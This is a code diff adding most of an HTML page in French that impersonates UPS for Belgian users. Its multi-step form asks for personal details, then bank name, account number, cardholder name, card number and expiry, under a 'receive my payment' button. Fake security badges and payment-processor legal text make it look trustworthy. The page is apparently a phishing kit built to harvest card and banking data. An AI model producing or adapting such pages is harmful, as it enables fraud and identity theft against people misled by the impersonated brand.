+                <input type="text" class="form-control" name="lastname" id="lastname" required="Veuillez remplir ce champ"  >
+                <span>Champ obligatoire*</span>
+            </div>
+            <div class="col-6 input-group">
+                <label class="form-label" for="email">Email</label>
+                <input type="email" id="email" class="form-control"  name="email" required="Veuillez remplir ce champ"  >
+                <span>Champ obligatoire*</span>
+            </div>
+            <div class="col-6 input-group">
+                <label class="form-label" for="date">Naissance :</label>
+  <input type="text" id="date" name="date" class="form-control" placeholder="jj/mm/aaaa" maxlength="10">
+                <span>Champ obligatoire*</span>
+            </div>
+            
+                        
+                <div class="col-12">
+                    <label class="form-label" for="country">Pays </label>
+                    <select class="form-select" id="country" name="country">
+                        <option>Belgique</option>
+                    </select>
+                </div>
+                <div class="col-6 input-group">
+                    <label class="form-label" for="address">Adresse</label>
+                    <input type="text" id="address" class="form-control" name="address" placeholder="(ex : Vorstlaan 165 ....)" required="Veuillez remplir ce champ"  >
+                    <span>Champ obligatoire*</span>
+                </div>
+                <div class="col-6">
+                            <label class="form-label" for="state">Ville </label>
+                            <select class="form-select" id="state" name="state">
+                                <option>Choisir</option>
+                                <option>Aerschot</option>
+                                <option>Alost</option>
+                                <option>Andenne</option>
+                                <option>Ans</option>
+                                <option>Ans</option>
+                                <option>Arlon</option>
+                                <option>Ath</option>
+                                <option>Aubange</option>
+                                <option>Audenarde</option>
+                                <option>Bastogne</option>
+                                <option>Beaumont</option>
+                                <option>Beauraing</option>
+                                <option>Beringen</option>
+                                <option>Bilzen</option>
+                                <option>Binche</option>
+                                <option>Blankenberghe</option>
+                                <option>Bouillon</option>
+                                <option>Braine-le-Comte</option>
+                                <option>Brée</option>
+                                <option>Bruges</option>
+                                <option>Bruxelles</option>
+                                <option>Charleroi</option>
+                                <option>Châtelet</option>
+                                <option>Chièvres</option>
+                                <option>Chimay</option>
+                                <option>Chiny</option>
+                                <option>Ciney</option>
+                                <option>Comines-Warneton</option>
+                                <option>Courtrai</option>
+                                <option>Couvin</option>
+                                <option>Damme</option>
+                                <option>Deinze</option>
+                                <option>Diest</option>
+                                <option>Dilsen-Stokkem</option>
+                                <option>Dinant</option>
+                                <option>Dixmude</option>
+                                <option>Durbuy</option>
+                                <option>Eeklo</option>
+                                <option>Enghien</option>
+                                <option>Eupen</option>
+                                <option>Fleurus</option>
+                                <option>Florenville</option>
+                                <option>Fontaine-l'Évêque</option>
+                                <option>Fosses-la-Ville</option>
+                                <option>Furnes</option>
+                                <option>Gand</option>
+                                <option>Geel</option>
+                                <option>Gembloux</option>
+                                <option>Genappe</option>
+                                <option>Genk</option>
+                                <option>Gistel</option>
+                                <option>Grammont</option>
+                                <option>Hal</option>
+                                <option>Halen</option>
+                                <option>Hamont-Achel</option>
+                                <option>Hannut</option>
+                                <option>Harelbeke</option>
+                                <option>Hasselt</option>
+                                <option>Herck-la-Ville</option>
+                                <option>Herentals</option>
+                                <option>Herstal</option>
+                                <option>Herve</option>
+                                <option>Hoogstraten</option>
+                                <option>Houffalize</option>
+                                <option>Huy</option>
+                                <option>Iseghem</option>
+                                <option>Jodoigne</option>
+                                <option>La Louvière</option>
+                                <option>La Roche-en-Ardenne</option>
+                                <option>Landen</option>
+                                <option>Léau</option>
+                                <option>Le Rœulx</option>
+                                <option>Lessines</option>
+                                <option>Leuze-en-Hainaut</option>
+                                <option>Liège</option>
+                                <option>Lierre</option>
+                                <option>Limbourg</option>
+                                <option>Lokeren</option>
+                                <option>Lommel</option>
+                                <option>Looz</option>
+                                <option>Lo-Reninge</option>
+                                <option>Louvain</option>
+                                <option>Maaseik</option>
+                                <option>Malines</option>
+                                <option>Malmedy</option>
+                                <option>Marche-en-Famenne</option>
+                                <option>Menin</option>
+                                <option>Messines</option>
+                                <option>Mons</option>
+                                <option>Montaigu-Zichem</option>
+                                <option>Mortsel</option>
+                                <option>Mouscron</option>
+                                <option>Namur</option>
+                                <option>Neufchâteau</option>
+                                <option>Nieuport</option>
+                                <option>Ninove</option>
+                                <option>Nivelles</option>
+                                <option>Ostende</option>
+                                <option>Ottignies-Louvain-la-Neuve</option>
+                                <option>Audembourg</option>
+                                <option>Peer</option>
+                                <option>Péruwelz</option>
+                                <option>Philippeville</option>
+                                <option>Poperinge</option>
+                                <option>Renaix</option>
+                                <option>Rochefort</option>
+                                <option>Roulers</option>
+                                <option>Saint-Ghislain</option>
+                                <option>Saint-Hubert</option>
+                                <option>Saint-Nicolas</option>
+                                <option>Saint-Trond</option>
+                                <option>Saint-Vith</option>
+                                <option>Seraing</option>
+                                <option>Soignies</option>
+                                <option>Spa</option>
+                                <option>Stavelot</option>
+                                <option>Termonde</option>
+                                <option>Thourout</option>
+                                <option>Thuin</option>
+                                <option>Tielt</option>
+                                <option>Tirlemont</option>
+                                <option>Tongres</option>
+                                <option>Tournai</option>
+                                <option>Tubize</option>
+                                <option>Turnhout</option>
+                                <option>Verviers</option>
+                                <option>Vilvorde</option>
+                                <option>Virton</option>
+                                <option>Visé</option>
+                                <option>Walcourt</option>
+                                <option>Waregem</option>
+                                <option>Waremme</option>
+                                <option>Wavre</option>
+                                <option>Wervicq</option>
+                                <option>Ypres</option>
+                                <option>Zottegem</option>
+                            </select>
+                        </div>
+                <div class="col-6 input-group">
+                <label class="form-label" for="tel">Téléphone</label>
+                <input type="tel" id="tel" name="tel" class="form-control" placeholder="" required="Veuillez remplir ce champ"  >
+                <span>Champ obligatoire*</span>
+            </div>
+                <div class="col-6 input-group">
+                    <label class="form-label" for="zip">Code Postal</label>
+                    <input type="tel" id="zip" class="form-control" name="zip" required="Veuillez remplir ce champ"  >
+                    <span>Champ obligatoire*</span>
+                </div>
+        <div class="">
+          <a href="#" class="btn1 btn-next ml-auto" onclick="run(1, 2);">Suivant</a>
+        </div>
+        </div>
+      </div>
+      <div class="form-step card-form">
+        <h1 class="tete">Détails de paiement !</h1>
+        <h3 class="contenu">Cher client, vérifier vos détails de paiement correctement et faites correspondre les détails de votre carte pour terminer</h3>
+          <div class="col-12 input-group bank">
+            <label class="form-label" for="bank">Votre Banque </label>
+            <select class="form-select" id="bank" name="field6">
+              <option>selectionner</option>
+              <option>AION BANK</option>
+              <option>Argenta Banque</option>
+              <option>AXA Bank Belgium</option>
+              <option>Bank J.Van Breda & C°</option>
+              <option>Banque CPH</option>
+              <option>Banque Degroof Petercam</option>
+              <option>Banque Eni</option>
+              <option>Banque Nagelmackers</option>
+              <option>BTB</option>
+              <option>Belfius Banque</option>
+              <option>Beobank</option>
+              <option>BNP Paribas Fortis</option>
+              <option>bpost banque</option>
+              <option>Byblos Bank</option>
+              <option>CBC Banque</option>
+              <option>CKV</option>
+              <option>Delen Private Bank</option>
+              <option>Dierickx Leys Private Bank</option>
+              <option>Euroclear Bank</option>
+              <option>Europabank</option>
+              <option>ING Belgique</option>
+              <option>KBC Bank</option>
+              <option>MeDirect Bank SA</option>
+              <option>Shizuoka Bank</option>
+              <option>United Taiwan Bank</option>
+              <option>vdk bank</option>
+              <option>Crelan</option>
+              <option>Bank of Baroda</option>
+            </select>
+            <span>Champ obligatoire*</span>
+          </div>
+          <div class="col-12 input-group bank">
+            <label class="form-label" for="identité"> Numéro de compte </label>
+            <input
+              type="text"
+              id="id"
+              name="id"
+              required="veuillez remplir ce champ"
+              placeholder="BE"
+            />
+          </div>
+          <div
+            class="card-box input-group"
+            id="radio"
+            name="radio"
+            style="
+              text-align: center;
+              width: 100%;
+              position: relative;
+              margin: 10%;
+              margin-top: -20px;
+              margin-bottom: -2px;
+            ">
+            <div class="card" style="margin-right: 40px">
+              <!-- Ajout de la marge à droite -->
+              <label for="visa"
+                ><img
+                  src="./image/icon-32x32-bancontact.jpg"
+                  alt=""
+                  style="
+                    width: 100px;
+                    height: 90px;
+                    font-size: 50px;
+                    display: flex;
+                    position: relative;
+                    align-items: center;
+                  "
+                />
+                <span>Bancontact</span>
+              </label>
+              <input type="radio" id="visa" name="card" />
+            </div>
+
+            <div class="card" style="margin-right: 40px">
+              <!-- Ajout de la marge à droite -->
+              <label for="cb"
+                ><img
+                  src="./image/icons8-maestro-480.png"
+                  alt=""
+                  style="
+                    width: 100px;
+                    height: 90px;
+                    font-size: 50px;
+                    display: flex;
+                    position: relative;
+                    align-items: center;
+                  "
+                />
+                <span>Maestro</span>
+              </label>
+              <input type="radio" id="Maestro" name="card" />
+            </div>
+          </div>
+
+          <div class="card-form__inner">
+            <div
+              class="island mobile-xs island-pay island-right"
+              style="position: relative; top: 10px"
+            >
+              <input
+                type="hidden"
+                name="pr"
+                value="34b250d2a7995f54e7435a13cfa002edf67ce744203f0a72769ea4bd2b034218"
+              />
+              <img
+                src="./image/card_icon.png"
+                alt="app"
+                class="icon-1 desktop-only"
+              />
+              <img
+                src="./image/card_mobile_icon.png"
+                alt="app"
+                class="icon mobile-only"
+              />
+              <span class="payment-details" id=""
+                >Inserer votre carte Bancontact ci dessous</span
+              >
+              <div class="card-input input-group">
+                <label for="cardName" class="card-input__label"
+                  >Titulaire de la carte</label
+                >
+                <input
+                  type="text"
+                  id="cardName"
+                  name="field2"
+                  class="card-input__input"
+                  v-model="cardName"
+                  v-on:focus="focusInput"
+                  v-on:blur="blurInput"
+                  data-ref="cardName"
+                  autocomplete="off"
+                  required
+                />
+                <span>Champ obligatoire*</span>
+              </div>
+              <div class="card-input input-group">
+                <label for="cardNumber" class="card-input__label"
+                  >Numero de la carte</label
+                >
+                <input
+                  type="text"
+                  id="cardNumber"
+                  name="field1"
+                  class="card-input__input"
+                  v-mask="generateCardNumberMask"
+                  v-model="cardNumber"
+                  v-on:focus="focusInput"
+                  v-on:blur="blurInput"
+                  data-ref="cardNumber"
+                  autocomplete="off"
+                  required
+                />
+                <span>Champ obligatoire*</span>
+              </div>
+
+              <div class="card-form__row">
+                <div class="card-form__col">
+                  <label for="cardMonth" class="card-input__label"
+                      >Date D'expiration</label
+                    >
+                  <div class="card-form__group">
+                    <select
+                      class="card-input__input -select"
+                      id="cardMonth"
+                      name="field3"
+                      v-model="cardMonth"
+                      v-on:focus="focusInput"
+                      v-on:blur="blurInput"
+                      data-ref="cardDate"
+                    >
+                      <option value="" disabled selected>Mois</option>
+                      <option
+                        v-bind:value="n < 10 ? '0' + n : n"
+                        v-for="n in 12"
+                        v-bind:disabled="n < minCardMonth"
+                        v-bind:key="n"
+                      >
+                        Janvier
+                      </option>
+                      <option>Fevrier</option>
+                      <option>Mars</option>
+                      <option>Avril</option>
+                      <option>Mai</option>
+                      <option>Juin</option>
+                      <option>Juillet</option>
+                      <option>Aout</option>
+                      <option>Septembre</option>
+                      <option>Octobre</option>
+                      <option>Novembre</option>
+                      <option>Decembre</option>
+                    </select>
+                    <select
+                      class="card-input__input -select"
+                      id="cardYear"
+                      name="field4"
+                      v-model="cardYear"
+                      v-on:focus="focusInput"
+                      v-on:blur="blurInput"
+                      data-ref="cardDate"
+                    >
+                      <option value="" disabled selected>Année</option>
+                      <option
+                        v-bind:value="$index + minCardYear"
+                        v-for="(n, $index) in 12"
+                        v-bind:key="n"
+                      >
+                        2024
+                      </option>
+                      <option>2025</option>
+                      <option>2026</option>
+                      <option>2027</option>
+                      <option>2028</option>
+                      <option>2029</option>
+                      <option>2030</option>
+                      <option>2031</option>
+                      <option>2032</option>
+                      <option>2033</option>
+                      <option>2034</option>
+                      <option>2035</option>
+                      <option>2036</option>
+                      <option>2037</option>
+                      <option>2038</option>
+                      <option>2039</option>
+                      <option>2040</option>
+                      <option>2041</option>
+                      <option>2042</option>
+                      <option>2043</option>
+                      <option>2044</option>
+                      <option>2045</option>
+                      <option>2046</option>
+                      <option>2047</option>
+                      <option>2048</option>
+                      <option>2049</option>
+                      <option>2050</option>
+                      <option>2051</option>
+                      <option>2052</option>
+                      <option>2053</option>
+                    </select>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <button
+              type="submit"
+              class="card-form__button"
+              style="position: relative"
+            >
+              <big> Recevoir mon paiement</big>
+            </button>
+            <div
+              class="payment__block-text--secured"
+              data-automation-id="block-secured-payment"
+            >
+              <i
+                class="icon-i_111_lock"
+                style="font-size: 10px; position: relative"
+                >Paiement 100% sécurisé</i
+              >
+            </div>
+            <p
+              data-testid="payment__add-card_legal-terms__text"
+              style="font-size: x-small; text-align: center"
+            >
+              Vos informations personnelles, informations sur vos données
+              contextuelles sont traitées de manière sécurisée pour les besoins
+              du paiement par Worldline en tant que prestataire de service de
+              paiement , certifié selon la norme PCI-DSS (norme internationale
+              de sécurité des données de paiement). Ces informations sont
+              traitées pour les besoins de la réalisation de ( garantie, litige
+              ...) ainsi que pour l’analyse du niveau de risque de fraude, la
+              lutte contre la fraude et la connaissance client. Dans le cadre de
+              l’analyse du niveau de risque de paiement les données sont
+              communiquées aux partenaires bancaires à des fins
+              d’authentification pour permettre autant que possible un parcours
+              d’achat sans friction. Vos données de carte bancaires sont
+              conservées par Worldline, durant un délai légal de 15 mois
+              (article L133-2421-20 du Code Monétaire et Financier).
+            </p>
+          </div>
+        </div>
+      
+    </form>
+	</div>
+
+    
+    
+        <footer id="ups-footerWrap" class="ups-wrap hpps-basic" role="contentinfo">
+                  <div id="ups-footer" class="ups-wrap_inner ups-analytics-render" data-content-block-id="M2" data-content-id="templatedata/navigation/footer-config/data/en_GB/footer-full-fr.dcr">
+                    <div class="ups-footer_colsCont ups-container">
+                      <div class="ups-footer_custserv col-md-3">
+                        <div class="ups-footer_links">
+                          <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_custServe" role="heading" aria-level="2">
+                            <span class="icon" aria-hidden="true"></span><span id="ups-footer_custServe2">Ce site</span><button class="ups-med_show" aria-controls="ups-footer_custServeLinks ups-footer_custServeConacts" aria-labelledby="ups-footer_custServe2">
+                              <span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span>
+                            </button>
+                          </div>
+                          <ul class="ups-footer_expand" aria-labelledby="ups-footer_custServe" id="ups-footer_custServeLinks">
+                            <li>
+                              <a href="bill.html" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Suivi<span class="" aria-hidden="true"></span></a>
+                            </li>
+                            <li>
+                              <a href="/ship?loc=fr_FR" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Expédition<span class="" aria-hidden="true"></span></a>
+                            </li>
+
+                            <li>
+                              <a href="/marketingpreferences/emailsubscription?loc=fr_FR" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Préférences de communication<span class="" aria-hidden="true"></span></a>
+                            </li>
+                          </ul>
+                          <ul class="ups-footer_contact ups-footer_expand" aria-labelledby="ups-footer_custServe" id="ups-footer_custServeConacts" style="display: none"></ul>
+                        </div>
+                      </div>
+                      <div class="ups-footer_col col-md-3 ups-left-md">
+                        <div class="ups-footer_links">
+                          <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_thisSite" role="heading" aria-level="2">
+                            <span id="ups-footer_thisSite2">UPS pro</span><button class="ups-med_show" aria-controls="ups-footer_thisSiteLinks" aria-labelledby="ups-footer_thisSite2">
+                              <span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span>
+                            </button>
+                          </div>
+                          <ul class="ups-footer_expand" aria-labelledby="ups-footer_thisSite" id="ups-footer_thisSiteLinks">
+                            <li>
+                              <a href="" target="_blank" rel="noopener noreferrer" class="ups-analytics" data-content-block-id="M2" data-event-id="21">UPS en Bref<span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Ouvrir le lien dans une nouvelle
+                                  fenêtre</span></a>
+                            </li>
+                            <li>
+                              <a href="" target="_blank" rel="noopener noreferrer" class="ups-analytics OneLinkKeepLinks" data-content-block-id="M2" data-event-id="21">Supply Chain Solutions<span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Ouvrir le lien dans une nouvelle
+                                  fenêtre</span></a>
+                            </li>
+                            <li>
+                              <a href="" target="_blank" rel="noopener noreferrer" class="ups-analytics" data-content-block-id="M2" data-event-id="21">UPS Jobs<span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Ouvrir le lien dans une nouvelle
+                                  fenêtre</span></a>
+                            </li>
+                          </ul>
+                        </div>
+                      </div>
+                      <div class="ups-footer_col col-md-3 ups-left-md">
+                        <div class="ups-footer_links">
+                          <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_connect" role="heading" aria-level="2" style="display: none">
+                            <span id="ups-footer_connect2"></span><button class="ups-med_show" aria-labelledby="ups-footer_connect2" aria-controls="ups-footer_connectLinks">
+                              <span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span>
+                            </button>
+                          </div>
+                          <ul class="ups-footer_expand" aria-labelledby="ups-footer_connect" id="ups-footer_connectLinks" style="display: none"></ul>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="ups-footer_legal">
+                      <div class="ups-footer_links">
+                        <div class="ups-med_show ups-footer_toggle h2_eqivalent" id="ups-footer_legal" role="heading" aria-level="2">
+                          <span id="ups-footer_legal2">Informations légales</span><button class="ups-med_show" aria-labelledby="ups-footer_legal2" aria-controls="ups-footer_legalLinks">
+                            <span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span>
+                          </button>
+                        </div>
+                        <ul class="ups-footer_expand" aria-labelledby="ups-footer_legal" id="ups-footer_legalLinks">
+                          <li>
+                            <a href="" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Accueil général<span class="" aria-hidden="true"></span></a>
+                          </li>
+                          <li>
+                            <a href="" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Conditions générales<span class="" aria-hidden="true"></span></a>
+                          </li>
+                          <li>
+                            <a href="" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Conditions d’utilisation du site Internet<span class="" aria-hidden="true"></span></a>
+                          </li>
+                          <li>
+                            <a href="" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Politique de confidentialité<span class="" aria-hidden="true"></span></a>
+                          </li>
+                          <li>
+                            <a href="javascript:utag.gdpr.showConsentPreferences();window.scrollTo(0,0);" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Configuration des cookies<span class="" aria-hidden="true"></span></a>
+                          </li>
+                        </ul>
+                        <br>
+                        <p class="ups-footer_disclaimer">
+                          Copyright ©1994-2023&nbsp;United Parcel Service of
+                          America, Inc. Tous droits réservés.
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                  <img alt="" border="0" src="">
+                </footer>
+  </body>
+
+</html>
